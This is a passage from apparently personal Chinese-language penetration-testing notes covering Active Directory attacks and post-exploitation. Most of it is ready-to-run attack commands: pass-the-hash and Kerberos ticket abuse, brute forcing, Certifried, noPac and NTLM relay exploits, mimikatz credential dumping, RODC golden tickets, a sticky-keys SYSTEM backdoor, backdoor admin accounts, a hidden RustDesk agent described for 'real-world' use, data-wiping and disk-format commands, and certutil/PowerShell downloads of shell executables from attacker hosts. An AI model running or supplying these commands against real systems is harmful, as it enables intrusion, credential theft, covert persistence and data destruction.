...
密码
```zsh
net time -S $ip -U "$domain/$user%$pass"
# 代理
sudo proxychains4 net time set -S $ip -U "$domain/$user%$pass"
```
hash
```zsh
net time -S $ip -U "$domain/$user" -N --pw-nt-hash $hash
# 代理
sudo proxychains4 net time -S $ip -U "$domain/$user" -N --pw-nt-hash $hash
```
tgt
```zsh
sudo proxychains4 net time -S $ip -U "$domain/$user" -N --use-kerberos=desired --use-krb5-ccache=$ccache
#代理
sudo proxychains4 net time -S $ip -U "$domain/$user" -N --use-kerberos=desired --use-krb5-ccache=$ccache
```
### 端口详细扫
...
之后抓取
```zsh
proxychains4 rusthound -i "$ip"  -d "$domain" -u "$user@$domain" -k  -o ./ -z --ldaps -f "$dc"
```
#### bloodhound-python
密码
```zsh
...
hash
```zsh
bloodhound-python -d $domain -c ALL -u $user --hashs :$hash -ns $ip --zip
```
dns服务不正常（透过代理抓取）处理办法
```zsh
# 先将dc写入hosts
# 之后利用dnsmasq将本地充当dns服务器进行本地解析
# 如果没有需要下载一个
sudo apt-get install dnsmasq
# 将/etc/dnsmasq.conf内容写入如下内容
address/DC01.domain.com/10.10.10.10
# 之后重启dnsmasq服务
sudo systemctl restart dnsmasq
# 指定ns为自身正常抓取
bloodhound-python -d $domain -c ALL -u $user -p $pass -ns 127.0.0.1 -dc $host --zip
```
### ldap查询(包含匿名ldap)
...
mssql爆破 （九头蛇
```zsh
hydra $ip mssql -L ./user.txt -P ./pass.txt
```
### dc存活用户枚举
#### kerbrute爆破
```zsh
...
nxc高版本也可以
```zsh
nxc mssql $ip -u $user -p $pass  --local-auth --rid-brute
```
#### ldap查询
```zsh
...
```
### tun流量虚拟网卡
如果只是想通过边界入侵内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains，并且ligolo的tun流量会将隧道实现最稳定的模式，远超socks流量

但经过测试，windows端的ligolo——proxy使用有很大问题，在配置winunl的情况下依旧无法连接流量，所以主控以linux为主

ligoli上线分为四步 1-上线，2-创建本地网卡，3-将tun流量绑定至网卡，4-清除网卡
#### 1-上线
##### ligolo-ng虚拟网卡(反向连接)
...
##### ligolo-ng虚拟网卡(正向)
其余设置与反向一致，只是连接以agent充当服务器，这里以被攻击机本地的9001监听
```zsh
./agent -bind 0.0.0.0:9001
```
启动代理服务端-攻击端kali执行
```zsh
./proxy -laddr 0.0.0.0:9001 -selfcert  # 监听 9001 端口
```之后本地主动连接
```zsh
ligolo-ng » connect_agent --ip $入口机:9001
```
#### 2-创建网卡
创建网卡
```zsh
...
```
#### 3-绑定流量
首先session选择目标agent，之后使用如下命令绑定网卡
```zsh
tunnel_start --tun $网卡名
```
随后使用ifconfig查看当前agent网段，例如
```zsh
[Agent : root@webserver.aoseluauto.com] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
...
├──────────────┬────────────────────────────────┤
│ Name         │ ens5                           │
│ Hardware MAC │ 00:16:3e:16:7e:47              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.53.30/16                │
│ IPv6 Address │ fe80::216:3eff:fe16:7e47/64    │
└──────────────┴────────────────────────────────┘
```
将网段建立在这个路由上,跟具如上路由，命令如下
```zsh
route_add --name $网卡名 --route 172.16.53.30/16
```
可以通过route_list查看路由情况
#### 注意
请使用完毕务必删除网卡，否则会导致流量乱流
#### ligolo-ng多级网络思路
暂略
# 提权or横向
## 密码过期用户更改密码
...
服务劫持注册表写法
```zsh
reg add HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ImagePath /t REG_EXPAND_SZ /d  "C:\ProgramData\sb.exe"
```
## bypassUAC
### GUI下绕过uac
...
查询是否有数据库开启TRUSTWORTHY
```zsh
SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases;
```
查询是否有用户是这个数据库的db_oner
```zsh
...
所有调度默认在msdb中查询更改以及使用，其利用mssql-agent服务账户自动运行作业而不是mssql-server服务账户，注意mssql-agent服务默认是不启用或者需要手动开启的，以下大部分内容仅仅在其以及开启使用的情况下有用.且以下命令全部以impacket-mssqlclient执行为准。
...
## Oracle相关
### odat利用
查看是否允许sysadm登陆，并筛查当前环境
```zsh
odat all -s $ip  -n $database   -U $user   -P $pass --sysdba
```
是否允许执行命令
```zsh
odat externaltable -s $ip  -n $database   -U $user   -P $pass --sysdba --test-module
```
如果允许，可以执行命令，建议不要过长
```zsh
odat dbmsscheduler -s $ip  -n $database   -U $user   -P $pass --sysdba --exec 'net user wackymaker wack1234! /add'
```
## 域历史漏洞或者中继（cve）
### Certifried(CVE-2022-26923)证书漏洞
#### 要求
需要一个已经掌握的域用户，并且允许创建机器用户

需要2022年左右的adcs，检测是否存在逻辑如下
```zsh
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
```
如果 Certipy 不打印Certificate object SID is [...]获得证书后,就可以进行攻击。
#### 攻击命令
创建机器用户,certipt会提供创建用户的密码
```zsh
certipy account create -u $user -hashes $hash -user "wack" -dc-ip $dc_ip  -dns $dns_fqdn
```
注册dc机器证书
```zsh
certipy -debug req \
...
-target $ca_ip
```
此证书可用于dc机器用户身份认证，后续思路是直接认证dc用户hash或者传递证书进行rbcd
### nopac漏洞
#### 要求
必须同时存在以下两个漏洞：
...
DC 对 不存在的计算机账户名 处理不严

CVE‑2021‑42287

TGS 校验 sAMAccountName 与 SID 不一致
...
一句命令攻击
```zsh
python3 CVE-2025-33073.py -u $domain\$user -p $pass --attacker-ip $kali_ip --dns-ip $dns_ip --dc-fqdn $DC_FQDN --target $TARGET_FQDN --target-ip $TARGET_IP
```
成功的话会获取target的机器用户hash，并且获取此机器所有本地用户hash（sam）
#### 实操小提示
如果发现ca存在esc8，并且33073可用，则可进行组合利用，具体操作搜索本笔记esc8
#### 跨协议中继（衍生用法允许直接攻击dc）
当发现目标环境没有25年1月左右的更新，或者说存在33073漏洞时，我们可以利用跨协议中继直接攻击dc

因为smb协议存在签名认证，但其他的不存在，所以我们那dc的winrm来举例

首先对dc添加33073特有的dns解析为kali
```zsh
python3 dnstool.py -u '$domain\$user' -p '$pass' $ip --action add -r $hostname1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d $kali_ip
```
利用ntlmrelay中继目标为dc的winrm（或者winrms）
```zsh
impacket-ntlmrelayx -debug -smb2support --target winrm://$ip
```
另一边用nxc查找允许coerce
```zsh
...
触发中继
```zsh
nxc smb $ip -u $user -p $pass -M coerce_plus -o ='$hostname1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' METHOD=DFSCoerce
```
触发成功后会在ntlmrelay处看到中继成功，使用nc连接本地的11000端口获得dc的system权限
...
```
### SeRestorePrivilege
要求需要桌面级操作，可提升至system
```zsh
ren sethc.exe sethc.bak
ren cmd.exe sethc.exe
```
执行完毕以上操作后，退出登陆，锁定用户之后，五下shift，会弹出cmd.exe，并且权限为system
### SeBackupPrivilege
```zsh
...
```
#### 注意
2021年更新后的ad无法使用，微软对这一功能进行了加固：

ServerLevelPluginDll 参数已被移到受保护的注册表位置（HKLM\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters）。
只有完全管理员（如 Domain Admins 或 DNS 服务器本地的 Administrators）才能修改它。
### AD Recycle （ad回收）
先查询是否存在已回收高敏感权限
```powershell
...
```
如果没有权限添加入管理员组，则可以直接打rbcd，此组用户默认对域控以外的域内计算机也是全部权限
...
```
```powershell
Rubeus.exe monitor /interval:1 /nowrap /targetuser:CDC01$
```
```powershell
...
hash
```zsh
.\Rubeus.exe asktgt /user:$user /rc4:$hash /domain:$domain /nowrap
```
利用这个票据去请求管理员或者dc机器用户的票据并注入内存
```zsh
.\Rubeus.exe s4u /ticket:$ticket /msdsspn:cifs/dc.$domain /impersonateuser:$target_or_admin /domain:$domain /ptt
##解释
...
```
搞定管理员或者dc后直接打dcsync即可,或者直接psexec
##### impacket
```zsh
...
修改为esc1
```zsh
.\StandIn_v13_Net35.exe --ADCS --filter Machine --ess --add
```
赋予域用户注册权
```zsh
.\StandIn_v13_Net35.exe --ADCS --filter Machine --ntaccount "domain\domain users" --enroll --add
```
请求管理员证书
```zsh
...
或者构造对dc的rbcd
```zsh
python3 passthecert.py -action write_rbcd -crt server.crt -key server.key -domain $domain -dc-ip $dc_ip -delegate-to $dc_fqdn -delegate-from '域内掌控机器机器名$'
```
#### certipy-ad
```zsh
...
后面就是正常的rbcd打法了
##### 目标为域
当我们对域有dacl写入权限，我们将允许对任意用户写入对域dcsync的权限
...
下载地址
```zsh
https://github.com/YDHCUI/rustdesk
```
服务端建立在vps上（也可以是在内网机，主要是连接工具需要能访问到服务端，服务端不需要出网）
```zsh
./server -i $vps_ip
```
客户端运行
```zsh
.\agent.exe -s $vps_ip -u wack -p pass
```
在官网下载rustdesk连接工具，就可以连接了
```zsh
将网络的id服务器与中继服务器改为vps，端口分别默认为：21116与21117
# 注意必须等rustdesk出现回显再连接否则可能报无法连接中继服务器报错
```
默认执行agent会启用黑窗口，靶机环境无所谓，但是实战环境最好使用隐藏脚本

start.bat
```zsh
agent.exe -s $ip -u admin -p pass
```
loader.vbs
```zsh
...
删库
```zsh
Remove-Item -Path "C:\Your\Path" -Recurse -Force
```
填充无意义字符
```zsh
cipher /w:C:\Your\Path
```
或者格式化盘符
```zsh
format D: /fs:ntfs /p:1 /q
```
# rodc相关
获取rodc管理员后，我们可以横向至主域，目前没有找到远程利用方式，主要使用powerview以及鲁博本地攻击

第一步，获取当前rodc的krbtgt用户hash，用户名称格式一般位krbtgt_$奇怪数字
```zsh
.\mimikatz.exe "Privilege::Debug" "log" "lsadump::lsa /patch" "exit"
```
第二步，注入powerview，并将域管理员添加允许同步时rodc属性
```zsh
Import-Module .\PowerView.ps1

清空属性
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=$domain,DC=local' -Clear 'msDS-NeverRevealGroup'

添加属性
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=$domain,DC=local' -Set @{'msDS-RevealOnDemandGroup'=@('CN=Administrator,CN=Users,DC=$domain,DC=local')}
```
第三步，构造黄金票据
```zsh
.\Rubeus.exe golden /rodcNumber:$krbtgt的数字 /rc4:$krbtgt_rodc_hash /user:administrator /id:500 /domain:$domain /sid:$domain_sid /nowrap
```
第四步，请求域管理hash
```zsh
.\Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/$domain /dc:$dc_FQDN /ticket:doIFpjCCBaKgLhYad......
```
## defender相关
### 添加排除目录
...
```
### 后门本地管理创建（需要本机管理员权限及以上）
```zsh
net user wackymaker wackMaker1! /add
net localgroup administrators wackymaker /add
```
...
### impacket
```zsh
显示有问题就只抓dc试试，加上参数-just-dc-ntlm
```
...
```
## 关闭全局uac(需要重启，需要system或者管理员权限)
执行后所有管理员默认以高权限运行，uac被移除
```zsh
...
```
#### nxc
最权威的一个，一键利用域管理抓取所有敏感信息
```zsh
nxc smb $ip -u administrator -p $pass --dpapi
```
## linux相关
### 部署ssh公钥后门
首先在本地生成公钥私钥
...
## 传递文件——传文件
### 分块传输
适应文件大小过大无法传输,以下命令是将程序分成100kb一份的程度
```zsh
aplit -b 100 shell
```
传递到目标机器后合并
...
certutil -urlcache -split -f http://172.22.60.52:4488/4433.exe C:\windows\tasks\win443.exe
powershell
Invoke-WebRequest -Uri http://172.22.3.12:8888/win443.exe -OutFile "C:\windows\tasks\win443.exe"
或者
(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.23:4444/shell.exe', 'C:\users\sqlsvc\Documents\shell.exe')
或者
powershell -c "iwr http://172.22.60.52:4488/4433.exe -OutFile $env:TEMP\win443.exe"
```
### 通用反向上传脚本（uploads.py）
```python
#!/usr/bin/env python3
